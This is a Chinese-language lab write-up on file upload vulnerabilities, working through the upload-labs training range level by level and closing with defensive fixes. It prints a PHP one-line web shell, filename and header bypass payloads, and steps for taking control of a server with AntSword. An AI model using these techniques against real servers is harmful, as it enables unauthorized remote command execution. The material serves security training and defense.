# 文件上传漏洞（File Upload）

> 一句话概述：服务器未能对用户上传的文件做充分校验，一旦恶意脚本成功上传并被解析执行，攻击者即可获取服务器 Web 权限（GetShell）。对应 CWE-434。

## 一、漏洞原理

文件上传漏洞的防御体系通常包含：前端 JS 校验、后端 MIME 校验、黑/白名单后缀校验、文件头（Magic Number）校验、二次渲染等。每种校验都有对应的绕过手法。

**核心武器（一句话木马）**：

```php
<?php @eval($_POST['cmd']); ?>
```

## 二、环境搭建

因直接访问 GitHub 可能受网络限制，使用 Gitee 镜像部署：

```bash
cd /var/www/html/
sudo git clone https://gitee.com/D544068814/upload-labs.git
sudo chmod -R 777 upload-labs/
```

## 三、基础校验与黑名单对抗（Pass-01 ~ Pass-10）

| 关卡 | 防御机制 | 绕过思路 |
|------|---------|---------|
| Pass-01 | 前端 JS 校验 | 将木马命名为 `shell.jpg` 上传，Burp 抓包把 `filename="shell.jpg"` 改为 `shell.php` 放行 |
| Pass-02 | MIME（Content-Type）校验 | 抓包把 `Content-Type: application/x-php` 改为 `image/jpeg` |
| Pass-03 | 黑名单漏网后缀 | 重命名为 `shell.phtml`、`shell.php3`、`shell.php5` 直接上传 |
| Pass-04 | 漏掉配置文件 | 先传 `.htaccess`（`AddType application/x-httpd-php .jpg`），再传图片木马 `shell.jpg` |
| Pass-05 | 大小写过滤不全 | `filename` 改为 `shell.pHp` 或 `shell.PHP` |
| Pass-06 | 未过滤空格 | `filename` 改为 `shell.php `（尾部空格，Windows 特性） |
| Pass-07 | 未过滤点 | `filename` 改为 `shell.php.`（尾部点，Windows 特性） |
| Pass-08 | 未过滤 `::$DATA` | `filename` 改为 `shell.php::$DATA`（NTFS 数据流） |
| Pass-09 | 过滤字符串组合 | `filename` 改为 `shell.php. .`（点+空格+点） |
| Pass-10 | 替换为空（双写） | 双写 `shell.pphphp`；或找黑名单漏网的 `.php7` / `.phar` |

> 踩坑提示：Pass-06 ~ Pass-09 依赖 Windows 系统特性，靶场运行在 Linux 下时文件会带多余字符导致 Apache 无法解析，这些手法在真实 Windows 服务器下才有效。

## 四、进阶关卡（Pass-11 ~ Pass-21）

- **Pass-11/12（%00 截断）**：保存路径 `save_path` 可控，抓包改为 `shell.php%00`。限制：PHP 5.3.4 以后已修复，PHP 7.x 下无法复现。
- **Pass-13 ~ 15（文件头校验）**：后端用 `getimagesize()` 校验，用 `cat normal.jpg shell.php > shell.jpg` 制作图片马，上传后需配合 LFI 才能触发执行。
- **Pass-16（二次渲染）**：后端用 GD 库重新生成图片，上传 GIF 图片马后用 010 Editor 定位未被破坏的像素区块重新插入代码。
- **Pass-17 ~ 19（条件竞争）**：后端逻辑「先保存 → 检查后缀 → 不合格删除」，用 Python 多线程或 Burp Intruder 高并发上传与访问，在删除前触发执行，生成常驻木马。
- **Pass-20/21（数组绕过）**：后端以数组接收文件名，抓包把 `save_name` 改为数组格式构造合法 `.php` 后缀：

```http
save_name[0]=shell.php/
save_name[1]=
```

## 五、GetShell 验证

1. 复制上传成功的木马路径（如 `http://127.0.0.1/upload-labs/upload/shell.php`）。
2. 打开中国蚁剑（AntSword）→ 右键「添加数据」。
3. URL 填木马路径，连接密码填 `cmd`（对应 `$_POST['cmd']`）。
4. 测试连接成功后双击进入文件管理，可浏览目录树并执行系统命令，Web 权限沦陷。

## 六、实战排坑记录

| 问题 | 根因 | 解决 |
|------|------|------|
| GitHub 拉取失败 | 网络受限无法访问 443 | 用 Gitee 镜像仓库 |
| 蚁剑无法启动 | root 运行 Electron 需关沙盒 | 加 `--no-sandbox` 启动 |
| .htaccess 被忽略 | Linux 图形界面新建易多出前缀 | 用 `mv 1.htaccess .htaccess` 强制重命名 |
| 条件竞争跑不出 | 并发过高导致服务器卡死 | 调低并发；或在源码 `unlink()` 前加 `sleep(3)` 放大窗口 |

## 七、防御与修复方案

1. **白名单原则（核心）**：抛弃黑名单，只允许 `jpg/png/gif` 等白名单后缀。
2. **文件重命名**：上传后用 UUID 或时间戳随机重命名，让攻击者无法预测和访问木马路径。
3. **内容与文件头检测**：校验 Magic Number（如 JPG 的 `FF D8 FF`），防止 MIME 伪造。
4. **禁止执行权限（最核心）**：配置上传目录禁止解析任何脚本，即使传上 `.php` 也只当纯文本下载。

```nginx
location /upload/ {
    location ~ \.php$ { deny all; }
}
```

5. **分离存储**：上传文件放独立静态资源服务器或对象存储（OSS/S3），物理隔离 Web 运行环境。

## 参考来源

- 《第八周-文件上传漏洞（Upload-labs）.md》与《第八周-文件上传漏洞（Upload-labs）实战操作报告.docx》
- 《第二部分-Web安全核心操作流程.docx》第 8 周
- OWASP. "File Upload Cheat Sheet." *OWASP Cheat Sheet Series*, cheatsheetseries.owasp.org.
